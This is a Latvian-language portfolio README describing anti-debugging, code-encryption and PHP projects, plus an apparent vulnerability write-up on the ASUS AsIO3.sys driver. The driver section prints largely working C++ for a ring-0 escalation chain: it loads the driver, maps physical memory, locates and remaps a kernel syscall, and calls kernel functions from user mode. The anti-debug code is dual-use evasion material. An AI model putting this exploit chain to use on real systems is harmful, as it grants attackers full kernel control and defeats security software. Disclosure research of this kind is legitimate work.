# Anti-DBG (Library & Test Project)
**Projekta mērķis** : Palīdz sargāt programmas intelektuālo vērtību no uzbrucējiem. (x64dbg, cheat-engine, ollydbg)  
**Kur tiek pielietots** : Video Spēlēs, Anti Vīrusos, Licenzētās Programmās.  

<sub>Viens no vispopulārākajiem debugging rīkiem. (x64dbg)</sub>
![alt text](https://x64dbg.com/img/slide2.png)

### Izmantojam syscall (system-call) priekšrocības, lai izvairītos no uzbrucēju modifikācijām.
```cpp

BOOL InitSyscalls(sSysCallData * pSysCallData)
{
	LOAD_SYSCALL(NtWriteVirtualMemory);
	LOAD_SYSCALL(NtReadVirtualMemory);
	LOAD_SYSCALL(NtAllocateVirtualMemory);
	LOAD_SYSCALL(NtFreeVirtualMemory);
	LOAD_SYSCALL(NtDeviceIoControlFile);
	LOAD_SYSCALL(NtCreateProcess);
	LOAD_SYSCALL(NtCreateUserProcess);
	LOAD_SYSCALL(NtQueryInformationProcess);
	LOAD_SYSCALL(NtTerminateProcess);
	LOAD_SYSCALL(NtSetInformationThread);
	LOAD_SYSCALL(NtGetContextThread);
	LOAD_SYSCALL(NtQueryPerformanceCounter);
	LOAD_SYSCALL(NtQuerySystemInformation);

	return true;
}
```
```cpp
NTSTATUS status = do_syscall<NTSTATUS>(SysCallData.NtQueryInformationProcess, hProcess, ProcessDebugPort, &found, sizeof(DWORD), NULL);
```

### Izmantojam VMProtect, lai apmulsinātu un sarežģitu darbu uzbrucējiem
```cpp
__forceinline bool AntiDebug::Interals::CheckWindowClassName()
{
	VMProtectBeginVirtualization(("CheckWindowClassName"));

  //CODE HERE

	VMProtectEnd();

	return true;
}
```

### Izmantojam dažādus paņemienus, lai noteiktu vai programmu cenšās uzlauzt uzbrucējs
**RDTSC(Read Time-Stamp Counter) - Processora cikla skaita balstīts paņēmiens**  
<sub>Nav efektīvākais un precīzākais paņēmiens, tomēr bieži sastopams.</sub>
```cpp
__forceinline bool AntiDebug::Interals::CheckRDTSC()
{
	VMProtectBeginMutation("CheckRDTSC");
  //CODE HERE
	TimeKeeper timeKeeper = { 0 };
	_RDTSCx64(&timeKeeper);

	timeA = timeKeeper.timeUpperA;
	timeA = (timeA << 32) | timeKeeper.timeLowerA;

	timeB = timeKeeper.timeUpperB;
	timeB = (timeB << 32) | timeKeeper.timeLowerB;

	// 0x100000 is purely based on the CPU clock speed
	if (timeB - timeA > 0x100000)
		found = TRUE;

	if (found)
	{
		// MORE CODE HERE
	}

	VMProtectEnd();

	return true;
}
```

**NtSetInformationThread(ThreadHideFromDebugger) - Paņemiens**  
<sub>Bieži sastopmas, DRM vai Anti Vīrusu programmās.</sub>
```cpp
bool AntiDebug::AddProtectedThread(DWORD ThreadID)
{
	VMProtectBeginVirtualization("AddProtectedThread");

	auto ThreadHideFromDebugger = static_cast<(THREAD_INFORMATION_CLASS)>(0x11);

	// There is nothing to check here after this call.
	if (do_syscall<NTSTATUS>(SysCallData.NtSetInformationThread, GetCurrentThread(), ThreadHideFromDebugger, 0, 0) != 0x0)
		return false;

	for (auto & entry : AntiDebug::Interals::m_ProtectedThread)
	{
		if (entry == ThreadID)
			return true;
	}

	AntiDebug::Interals::m_ProtectedThread.push_back(ThreadID);

	VMProtectEnd();

	return true;
}
```  

**FindWindowA - Paņemiens**  
<sub>Dažreiz pietiek ar vienkāršiem risinājumiem, lai uzbrucējs padotos.</sub>
```cpp
__forceinline bool AntiDebug::Interals::CheckWindowClassName()
{
	VMProtectBeginVirtualization(("CheckWindowClassName"));

	static std::vector<IAString> WindowClassNames = {
		XorString("OLLYDBG"), XorString("ID"), XorString("ProcessHacker"),
		XorString("WindowsForms10.Window.8.app.0.13965fa_r6_ad1")
	};

	for (auto & str : WindowClassNames)
	{
		hWindow = WinApi.FindWindowA(str.GetValue().c_str(), 0);
		if (hWindow != NULL)
		{
			found = true;
			break;
		}
	}

	if (found)
	{
    //CODE HERE
	}

	VMProtectEnd();

	return true;
}
```
<sub>Pārējie paņēmieni aplūkojami projektā.</sub>

# asio3_interface & asio3_shellcode

**Projekta mērķis** : Asus drivera vājības izmantošana, lai iegūtu **RING-0** privilēģijas    
**Kur tiek pielietots** : Lai ziņotu uzņēmumam par vājībām produkta drošībā.  

<sub>RING-0 ir līmenis Windows operētājsistēmā, kam ir piekļuve pilnīgi visiem resursiem.</sub>  

<sub>Bildē aplūkojamas asus izplatītās un licenzētās programmas, kurās vājības tika konstatētas un tiek pielietotas vēl šodien.</sub>
![alt text](https://i.gyazo.com/cae4dbb5f4c00d8174c57325721754ce.png)

### Vājibas simptomi
**ZwMapViewOfSection** - Šinī gadījumā tiek izmantos, lai sasaistītu virtuālo atmiņu ar fizisko atmiņu. (RAM)  
**ZwUnmapViewOfSection** - Šinī gadījumā tiek izmantos, lai atbrīvotu virtuālo atmiņu.  
<sub>Bildē aplūkojamas asus drivera (AsIO3.sys) importētās funckijas.</sub>
![alt text](https://i.gyazo.com/b9fbd64e3e3e6b4f7b90a2ae3cccf7b7.png)  
<sub>Bildē aplūkojamas kods no (AsIO3.sys), kā tiek veikta piekļuve fizikālajai atmiņai.</sub>
![alt text](https://i.gyazo.com/4e34262c0d0bf70186d83370dfaa6226.png)  

### Esošā aizsardzība un tās trūkumi  
![alt text](https://i.gyazo.com/a2d84b36355d2d6d78b07bd6eb118213.png)  
<sub>Bildē aplūkojamas (AsIO3.sys) šobrīdējā aizsardzība.</sub>  
Pēc bildes varam secināt, ka notiek pārbaude, salīdzinot procesa unikālo indeksu vai tā saturu.

### Aizsargmūra nojaukšana
Bruņots ar šo informāciju dzimst projekts **asio3_shellcode**

Tā mērķis? Izmantot aplūkotās vājības un pievienoties aizsardzības baltajā sarakstā(whitelistā)

![alt text](https://i.gyazo.com/2bcc74f87e3e39790d0e8ecbcbe1cca7.png)  
<sub>Bildē aplūkojam, kā tiek veikta pievienošanās baltajam sarakstam.</sub>  

### Nonākšana RING-0
Puscīņa ir uzverēta nonākot baltajā sarakstā, tomēr tas dod mums piekļuvi datora fiziskajai atmiņai, ne kontrollei visiem datora resurisiem.  
Aplūkosim, kā strādā asio3_interface, lai no šīs vājības izpiestu tās pilno potenciālu.

```cpp
bool asio3_interface::initialize_interface()
{

    //Attach to AsIO3.sys, if function fails then AsIO3 protection is still active
    this->device_handle = WinApi.CreateFileA(this->symbolic_link.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    //Check if the handle to the AsIO3.sys driver is valid, if not load the driver manually.
    DWORD last_error = GetLastError();
    printf("[initialize_interface] handle(0x%llX) last_error(0x%lX)\n", this->device_handle, last_error);
    if ((!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE) && last_error == ERROR_ACCESS_DENIED)
    {
        printf(XorString("[initialize_interface] driver already loaded\n"));
        this->driver_name = XorString("AsIO3");
        //Driver already loaded
    }
    else
    {
        //Driver not loaded
        if (!this->load_driver(&this->driver_name))
        {
            printf(XorString("[initialize_interface] Failed loading driver"));
            return false;
        }

        this->driver_load_performed = true;
    }

    //Load the asio3 shellcode into AsusCertService.exe to whitelist current process (Large function best seen in code)
    if (!this->bypass_handle_protection())
    {
        printf(XorString("[initialize_interface] initialize_interface step 2 failed\n"));
        this->on_exit();
        return false;
    }

    //Try retrieving the handle for the driver once more
    this->device_handle = WinApi.CreateFileA(this->symbolic_link.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    if (!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE)
    {
        printf(XorString("[initialize_interface] Failed creating valid handle\n"));
        this->on_exit();
        return false;
    }

    //If succesfull map NtShutdownProcess syscall to current process memory
    if (!this->map_syscall())
    {
        printf(XorString("[initialize_interface] Failed to map specified memory region\n"));
        this->on_exit();
        return false;
    }

    return true;
}
```

Tātad izmantojam Windows API funkciju **CreateFileA**, lai secinātu vai AsIO3.sys driveris eksistē mūsu sistēmā.  
Pēc tam apejam drivera aizsardzību saucot locālo funckiju **bypass_handle_protection** un visbeidzot izmantojam doto  
piekļuvi datora fiziskajai atmiņai, lai iegūtu iespēju palaist savu kodu RING-0 līmenī, saucot funkciju **map_syscall**.

```cpp
bool asio3_interface::map_syscall()
{
    //Locate the NtShutdownSystem function virtual address inside ntoskrnl.exe
    this->syscall_page_offset = reinterpret_cast<ULONG>(
        this->get_kernel_export(XorString("ntoskrnl.exe"), XorString("NtShutdownSystem"), true));

    //If function doesn't exist return
    if (!this->syscall_page_offset)
    {
        return false;
    }

    ULONG syscall_rva = this->syscall_page_offset;

    //Get the relative virtual address to the current memory page
    this->syscall_page_offset = this->syscall_page_offset % PAGE_SIZE;

    //Load windows main kernel component locally to use for memory scanning in RAM
    HMODULE ntoskrnl_local_buffer = (LoadLibraryExA(XorString("ntoskrnl.exe"), NULL, DONT_RESOLVE_DLL_REFERENCES));

    //If function failed return false
    if (!ntoskrnl_local_buffer)
    {
        return false;
    }

    //Allocate memory for bytes that we will scan for
    this->syscall_bytes.reserve(64); this->syscall_bytes.resize(64);

    //Copy the NtShutDownSystem functions first 64 bytres into the this->syscall_bytes array (vector)
    memcpy(this->syscall_bytes.data(), reinterpret_cast<PVOID>((ULONG64)ntoskrnl_local_buffer + syscall_rva), this->syscall_bytes.size());

    //Use windows registry to get currently present physical memoryies ranges
    std::vector<std::pair<ULONG64, ULONG>> phys_mem_ranges = this->get_physical_mem_ranges();

    //If there are no physical ranges function fails
    if (!phys_mem_ranges.size())
    {
        return false;
    }

    //For each phsyical range, scan each 2mb and 4096 byte memory page until we find the physical page containing NtShutdownSystem function
    for (auto& range : phys_mem_ranges)
    {
        this->physmeme_map_syscall(range.first, range.second);
    }

    //Check if we have found the syscall
    if (!this->syscall_located.load())
    {
        return false;
    }

    return true;
}

```

Varam arī aplūkot kā strādā **physmeme_map_syscall**, šīs funckija mērķis ir atrast RING0 funckiju fiziskajā atmiņā  
un izmantojot asio3 driveri ļaut esošajam processam mainīt tā atmiņu.

Aplūkojot kā windows atmiņa tiek strukturēta varam secināt, ka 99% windows datoros atmiņa tiek glabāta blokos, kuru izmēri ir  
4096 biti vai 2 megabaiti. (Ir iespējams arī 2gb bloks, bet ar tādu nav bijusi saskarsme)

```cpp
void asio3_interface::physmeme_map_syscall(ULONG64 begin, ULONG64 end)
{
    //Use llambda because it's way cleaner
    auto check_page = [&](asio3_interface* asio3, ULONG64 page) -> bool
    {
        if (asio3->syscall_located.load())
            return true;
        __try
        {
            if (memcmp(reinterpret_cast<PVOID>(page), asio3->syscall_bytes.data(), asio3->syscall_bytes.size()) != 0)
                return false;
            //We have found our syscall, perhaps add extra checks to verify it works here
            asio3->syscall_mapping.store(reinterpret_cast<PVOID>(page));
            //Verify that the syscall works
            if (!asio3->verify_syscall())
                return false;

            asio3->syscall_located.store(true);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) 
        {
        }
        return false;
    };

   
    constexpr ULONG size_2MB = 0x1000 * 512;

    asio3_interface* asio3 = asio3_interface::get_instance();
    if (begin + end <= size_2MB)
    {
        asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
        auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(begin + asio3->syscall_page_offset, end, &ioctl_buffer));
        if (page_va)
        {
            for (auto page = page_va; page < page_va + end; page += 0x1000)
            {
                if (check_page(asio3, page))
                    return;
            }
            asio3->unmap_phys_memory_x64(&ioctl_buffer);
        }
    }
    else
    {
        //Larger than 2MB
        auto remainder = (begin + end) % (size_2MB);
        for (auto range = begin; range < begin + end; range += size_2MB)
        {
            asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
            auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(range + asio3->syscall_page_offset, size_2MB, &ioctl_buffer));
            if (page_va)
            {
                for (auto page = page_va; page < page_va + size_2MB; page += 0x1000)
                {
                    if (check_page(asio3, page))
                        return;
                }
                asio3->unmap_phys_memory_x64(&ioctl_buffer);
            }
        }
        //Itterate the left over data
        asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
        auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(begin + end - remainder + asio3->syscall_page_offset, remainder, &ioctl_buffer));
        if (page_va)
        {
            for (auto page = page_va; page < page_va + remainder; page += 0x1000)
            {
                if (check_page(asio3, page))
                    return;
            }
            asio3->unmap_phys_memory_x64(&ioctl_buffer);
        }

    }
}
```

### Rezultāts un secinājumi
Projekts atklāj lielu drošības risku esošajās asus programmās, kuras brīvi apiet esošo anti vīrusu drošības implementācijas.
Bildē var aplūkot kā no parastas lietotāja programmas, spējam palaist RING0 funckiju **PsGetCurrentProcessId**,  
kā rezultātā esam nonākuši RING0 līmenī un datora drošība vairs nav limitācīja.
```cpp
int main()
{
	asio3_interface* vuln_driver = asio3_interface::get_instance();

	if (!vuln_driver->initialize_interface())
	{
		printf("Failed initialzing ASIO interface (0x%lX)\n", GetLastError());
		std::cin.get();
		return 1;
	}
	
	PVOID _PsGetCurrentProcessId = vuln_driver->get_kernel_export("ntoskrnl.exe", "PsGetCurrentProcessId");

	HANDLE kernel_pid = NULL;
	vuln_driver->call_function(_PsGetCurrentProcessId, &kernel_pid);//PsGetCurrentProcessId

	printf("PsGetCurrentProcessId : %i\n", kernel_pid);
	printf("GetCurrentProcessId : %i\n", GetCurrentProcessId());

	printf("Handle opened : 0x%lX\n", vuln_driver->device_handle);

	std::cin.get();

	vuln_driver->on_exit();

	return 1;
}
```
# DynamicCodeEncryption
**Projekta mērķis** : Sargāt un slēpt programmas kodu, pēc programmas palaišanas, kā arī sarežģīt tā izpratni pirms palaišanas.  
**Kur tiek pielietots** : Personīgos projektos, Video spēlēs, Anti vīrusos, Licenzētās programmās.  

### Projekta motivācīja.
Neapmierināts ar esošiem drošības risinājumiem nolēmu izveidot savējo.  
Tā mērķis bija vienkārš, lai pēc katras programmas palaišanas kods būtu neatpazīstams un unikāls,  
ja uzbrucējs cenšās to nolasīt vai analizēt.

### Projekta implementācīja un pielietojums  

Aplūkusim implementāciju
```cpp
void func()
{
    DYNAMIC_PROT_START(func);
    //Code starting here will be encrypted after execution, or if executed statically
    printf("func2 : %i\n", SAFE_CALL(bool, func2, nullptr, 1, 2, 3, 4, 5, 6, 7));

    DYNAMIC_PROT_END(func);
}

bool func2(PVOID mdl, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
    DYNAMIC_PROT_START(null_pfn);
    printf("func2 called %i %i %i %i %i %i %i %i!\n", mdl, a2, a3, a4, a5, a6, a7, a8);
    if (!mdl)
    {
        DYNAMIC_PROT_END_INLINE(null_pfn);
        return false;
    }


    DYNAMIC_PROT_END(null_pfn);
    return true;
}
```

Aplūkosim pielietojumu
```cpp
int main()
{
    //Allocate the list for the functions, done like this, due for it's compatability with kernel
    dynamic_encrypter_kernel::function_list = (protected_func*)VirtualAlloc(nullptr, sizeof(protected_func) * MAX_FUNCTIONS, MEM_COMMIT, PAGE_READWRITE);//new protected_func[MAX_FUNCTIONS];

    printf("func : 0x%llX\n", func);
    system("pause");

    //Static protect functions, these functions will get xored until they are called again
    dynamic_encrypter_kernel::static_protect_function(null_pfn);
    dynamic_encrypter_kernel::static_protect_function(func);

    //This function will get xored after being executed, it is valid only for short period
    dynamic_encrypter_kernel::safe_call<bool>(some_func, 15, std::string("Encryption is cool"));

    system("pause");
}

```

Izmantojam frāzes **DYNAMIC_PROT_START** un **DYNAMIC_PROT_END**, lai norādītu kuras koda daļas vēlamies aizsargāt,  
šinī gadījumā tas ir funckijās **void func()** un **bool func2()** atrodošais kods.  
**Aplūkosim kāda atšķirība ir c++ kodam (asm valodā) pirms un pēc aizsardzības.**  

![alt text](https://i.gyazo.com/c1e3f6399e298acc66f7260755967a90.png)  
![alt text](https://i.gyazo.com/2461a20cf0a148ebd0e3d10b73f62b41.png)  

### Aizsardzības piemērs

Aplūkosim safe_call funkciju, lai vairāk saprastu kā funkciju dati tiek mainīti.
```cpp
  template<typename T, class... Types> __forceinline T safe_call(PVOID func, Types&&... args)
    {
	//Find next executing instruction since current function is inlined
        PVOID enc_point_end = get_next_executing_instr();

        bool first_time = false;
        typedef T(__stdcall* _func)(Types...);
        _func function = (_func)func;

	//Locate if the function has already been registered as protected function
        protected_func* prot_func_entry = find_func_entry(func);

        {
            //Actually the current function since this shit is inlined
            PVOID ret_add = get_next_executing_instr();
            if (auto prev_prot_func = find_func_entry(ret_add))
            {
		//Add current function to stack and xor the upper half of it
                current_context_stack[current_context_stack_count] = prev_prot_func;
                current_context_stack_count++;
                prev_prot_func->partial_enc_size = (DWORD64)enc_point_end - (DWORD64)prev_prot_func->func_start;
                prev_prot_func->xor_segment(XOR_SEGMENT_FIST_HALF);
            }
        }

        T ret = T();
        if (!prot_func_entry)
        {
            //It creats protected_func instance in start protection call
            ret = function(args...);

            prot_func_entry = find_func_entry(func);

            if (!prot_func_entry)
                return ret;

            first_time = true;
        }


        //Decrypt the code
        if (prot_func_entry->is_encrypted)
        {
            prot_func_entry->xor_segment();
            prot_func_entry->is_encrypted = false;
        }

        if (!first_time)
            ret = function(args...);

        //Encrypt the code back
        prot_func_entry->is_encrypted = true;
        prot_func_entry->xor_segment();


        return ret;
    }
```

# custom-mysql-requests
**Projekta mērķis** : Ar php palīdzību elemtārā un drošā veidā sazināties ar mysql datubāzi.  
**Kur tiek pielietots** : Personīgos projektos.  

Aplūkosim piemēru, kur izmantojot mysql php klasi, ļoti vienkārši spējam sazināties ar datu bāzi.  
```php
public function renew_key(&$response, $user_id, $Token) {
        if($user_id == -1) {
            $response .= "userid invalid!\n";
            return 0;
        }

        //We call this here in order to delete old tokens that have expired
        $i_xf = new ia_xenforo_interface();
        $i_xf->xenforo_has_active_subscriptions($user_id, $response);

        $mysql = IA_MySql::get_instance();
        //Check if token exists
        $mysql_rows = $mysql->execute_command("SELECT * FROM `User-Tokens` WHERE `Token`=?;", "s", array($Token));
        if(count($mysql_rows) <= 0) {
            $response .= "No token found!\n";
            return 0;
        }
        if($mysql_rows[0]['IsUsed'] == 1) {
            $response .= "Token already used!\n";
            return 0;
        }

        $current_date = date("Y-m-d");

        $token_index = $mysql_rows[0]['Index'];
        $token_value = $mysql_rows[0]['Token'];
        $token_type = $mysql_rows[0]['TokenType'];
        $token_expire_type = $mysql_rows[0]['SubscriptionLength'];
        $token_addons = $mysql_rows[0]['KeyAddons'];

        $this->internal_activate_token($response, $user_id, $token_index, $token_type, $token_expire_type);

        //KEY ADDONS
        if(strlen($token_addons) > 0) {
            //That means this key has additional goodies we should activate
            foreach (explode(',', $token_addons) as $addon_token_type) {
                if(is_numeric($addon_token_type)) {
               //Create a new key
               $mysql->execute_command("INSERT INTO `User-Tokens` (`Token`, `TokenType`, `SubscriptionLength`, `IsUsed`, `TokenOwner`, `ExpireDate`) VALUES (?, ?, ?, '0', '', '');", "sii", array($token_value, $addon_token_type, $token_expire_type));
               //Get the key index
               $mysql_rows = $mysql->execute_command("SELECT * FROM `User-Tokens` WHERE `Token`=? AND `TokenType`=?;", "si", array($token_value, $addon_token_type));
               if(count($mysql_rows) <= 0) {
                $response .= "Failed fetching joint token index\n";
                return 0;
              }
               $addon_token_index = $mysql_rows[0]['Index'];

              $this->internal_activate_token($response, $user_id, $addon_token_index, $addon_token_type, $token_expire_type);

                }
            }
        }

  
        return 1;
    }
```

# custom-webhook-handling
**Projekta mērķis** : Ar php palīdzību drošā veidā uzņemt informāciju no e-komercijas pakalojuma sellix.  
**Kur tiek pielietots** : Personīgos projektos.  

Aplūkosim piemēru, kā apstrādājam pieejamos datus.
```php
require_once('sellix-webhook.inc.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/scripts/IAdb.inc.php');

  $payload = file_get_contents('php://input');
  $sellix_interface = new sellix_handler();
  if ($sellix_interface->verify_header() == 1) {
    // handle valid webhook
    echo "Signature valid!\n";

    $json_data = $sellix_interface->get_sellix_json_data($payload);
    
    if ($json_data === null) {
      $json_error = json_last_error_msg();
      error_log("JSON decoding error: $json_error");
      return;
    }

    echo "event: " . $json_data->event . " \n";
    if ($json_data->event == 'order:paid') {
	//Code here
	}
//Code here
}
```


